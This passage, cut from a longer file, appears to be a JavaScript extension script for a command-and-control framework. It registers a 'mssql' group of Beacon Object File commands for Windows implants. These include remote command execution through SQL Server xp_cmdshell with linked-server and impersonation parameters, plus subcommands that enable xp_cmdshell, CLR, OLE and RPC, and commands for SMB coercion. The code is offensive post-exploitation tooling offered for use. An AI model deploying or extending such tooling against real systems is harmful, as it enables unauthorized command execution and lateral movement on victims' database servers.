    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
    let bof_path = ax.script_dir() + "_bin/SQL/xpcmd." + ax.arch(id) + ".o";
    let message = "Task: SQL Server xp_cmdshell execution";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var cmd_mssql = ax.create_command("mssql", "Microsoft SQL Server BOF");
cmd_mssql.addSubCommands([_cmd_1434udp, _cmd_adsi, _cmd_agentcmd, _cmd_agentstatus, _cmd_checkrpc, _cmd_clr, _cmd_columns, _cmd_databases, _cmd_disableclr,
    _cmd_disableole, _cmd_disablerpc, _cmd_disablexp, _cmd_enableclr, _cmd_enableole, _cmd_enablerpc, _cmd_enablexp, _cmd_impersonate, _cmd_info, _cmd_links,
    _cmd_olecmd, _cmd_query, _cmd_rows, _cmd_search, _cmd_smb, _cmd_tables, _cmd_users, _cmd_whoami, _cmd_xpcmd
]);

var group_sql = ax.create_commands_group("SQL-BOF", [cmd_mssql]);
ax.register_commands_group(group_sql, ["beacon", "gopher", "kharon"], ["windows"], []);